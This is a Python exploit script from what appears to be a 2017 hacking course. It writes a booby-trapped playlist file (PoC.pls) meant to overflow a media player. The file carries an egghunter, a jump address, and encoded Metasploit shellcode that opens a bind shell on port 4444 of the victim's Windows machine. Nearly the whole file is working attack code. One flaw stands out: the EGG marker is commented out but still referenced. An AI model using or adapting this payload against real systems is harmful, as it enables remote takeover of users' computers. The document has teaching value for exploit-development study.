#!/usr/bin/env python 
# Hacking Techniques Course @2017
import struct


#EGG = "\x77\x30\x30\x74" # tag w00t
EGGHUNTER =  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
EGGHUNTER += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"



# windows/shell_bind_tcp - 355 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LPORT=4444, RHOST=192.168.91.141, 
# PrependMigrate=false, EXITFUNC=process, 
# InitialAutoRunScript=, AutoRunScript=
SHELLCODE = ("\xda\xc1\xba\x2e\xae\xb4\x96\xd9\x74\x24\xf4\x5f\x2b\xc9" +
"\xb1\x53\x31\x57\x17\x83\xef\xfc\x03\x79\xbd\x56\x63\x79" +
"\x29\x14\x8c\x81\xaa\x79\x04\x64\x9b\xb9\x72\xed\x8c\x09" +
"\xf0\xa3\x20\xe1\x54\x57\xb2\x87\x70\x58\x73\x2d\xa7\x57" +
"\x84\x1e\x9b\xf6\x06\x5d\xc8\xd8\x37\xae\x1d\x19\x7f\xd3" +
"\xec\x4b\x28\x9f\x43\x7b\x5d\xd5\x5f\xf0\x2d\xfb\xe7\xe5" +
"\xe6\xfa\xc6\xb8\x7d\xa5\xc8\x3b\x51\xdd\x40\x23\xb6\xd8" +
"\x1b\xd8\x0c\x96\x9d\x08\x5d\x57\x31\x75\x51\xaa\x4b\xb2" +
"\x56\x55\x3e\xca\xa4\xe8\x39\x09\xd6\x36\xcf\x89\x70\xbc" +
"\x77\x75\x80\x11\xe1\xfe\x8e\xde\x65\x58\x93\xe1\xaa\xd3" +
"\xaf\x6a\x4d\x33\x26\x28\x6a\x97\x62\xea\x13\x8e\xce\x5d" +
"\x2b\xd0\xb0\x02\x89\x9b\x5d\x56\xa0\xc6\x09\x9b\x89\xf8" +
"\xc9\xb3\x9a\x8b\xfb\x1c\x31\x03\xb0\xd5\x9f\xd4\xb7\xcf" +
"\x58\x4a\x46\xf0\x98\x43\x8d\xa4\xc8\xfb\x24\xc5\x82\xfb" +
"\xc9\x10\x3e\xf3\x6c\xcb\x5d\xfe\xcf\xbb\xe1\x50\xb8\xd1" +
"\xed\x8f\xd8\xd9\x27\xb8\x71\x24\xc8\xd7\xdd\xa1\x2e\xbd" +
"\xcd\xe7\xf9\x29\x2c\xdc\x31\xce\x4f\x36\x6a\x78\x07\x50" +
"\xad\x87\x98\x76\x99\x1f\x13\x95\x1d\x3e\x24\xb0\x35\x57" +
"\xb3\x4e\xd4\x1a\x25\x4e\xfd\xcc\xc6\xdd\x9a\x0c\x80\xfd" +
"\x34\x5b\xc5\x30\x4d\x09\xfb\x6b\xe7\x2f\x06\xed\xc0\xeb" +
"\xdd\xce\xcf\xf2\x90\x6b\xf4\xe4\x6c\x73\xb0\x50\x21\x22" +
"\x6e\x0e\x87\x9c\xc0\xf8\x51\x72\x8b\x6c\x27\xb8\x0c\xea" +
"\x28\x95\xfa\x12\x98\x40\xbb\x2d\x15\x05\x4b\x56\x4b\xb5" +
"\xb4\x8d\xcf\xc5\xfe\x8f\x66\x4e\xa7\x5a\x3b\x13\x58\xb1" +
"\x78\x2a\xdb\x33\x01\xc9\xc3\x36\x04\x95\x43\xab\x74\x86" +
"\x21\xcb\x2b\xa7\x63")



header = "[playlist]\r\nFile1=\\\\"
shellcode = "\x90" * 50 + EGG + EGG + SHELLCODE + "\x90" * 443 
egghunter ="\x90" * 10 + EGGHUNTER + "\x90" * 120
jmp = struct.pack("<I", 0x1a113749)
stop="\x90" * 4 + "\xe9\x4c\xff\xff\xff" + "\x90" * 3
end="\r\nTitle1=HTID\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"

buf = header + shellcode + egghunter + jmp + stop + end

f = open("PoC.pls", "w")
f.write(buf)
f.close()

print "Created poc.pls"
print "Size of buffer = ", len(buf)




